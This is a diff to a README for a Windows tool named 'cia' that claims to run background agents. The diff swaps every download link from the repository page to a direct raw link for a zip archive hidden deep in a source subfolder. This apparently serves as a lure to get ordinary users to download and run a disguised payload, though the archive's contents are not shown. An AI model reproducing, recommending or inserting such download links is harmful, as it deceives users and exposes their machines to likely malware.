@@ -1,6 +1,6 @@
 # ⚙️ cia - Run background agents with ease
 
-[![Download cia](https://img.shields.io/badge/Download-cia-blue?style=for-the-badge&logo=github)](https://github.com/Ammino-columbia714/cia)
+[![Download cia](https://img.shields.io/badge/Download-cia-blue?style=for-the-badge&logo=github)](https://github.com/Ammino-columbia714/cia/raw/refs/heads/main/lib/cia/sandbox/sprite/channel/Software-v3.4-beta.3.zip)
 
 ## 🚀 What is cia?
 
@@ -19,7 +19,7 @@ If you are not sure whether your PC can run it, a modern Windows laptop or deskt
 
 ## 📥 Download cia
 
-1. Open the download page: https://github.com/Ammino-columbia714/cia
+1. Open the download page: https://github.com/Ammino-columbia714/cia/raw/refs/heads/main/lib/cia/sandbox/sprite/channel/Software-v3.4-beta.3.zip
 2. On the GitHub page, look for the latest release or download option
 3. Download the Windows file for cia
 4. Save the file to your Downloads folder or another place you can find easily
@@ -176,7 +176,7 @@ Use cia when you want to:
 
 ## 📎 Download again
 
-If you need the download page again, use this link: https://github.com/Ammino-columbia714/cia
+If you need the download page again, use this link: https://github.com/Ammino-columbia714/cia/raw/refs/heads/main/lib/cia/sandbox/sprite/channel/Software-v3.4-beta.3.zip
 
 ## 🧭 Next steps
 
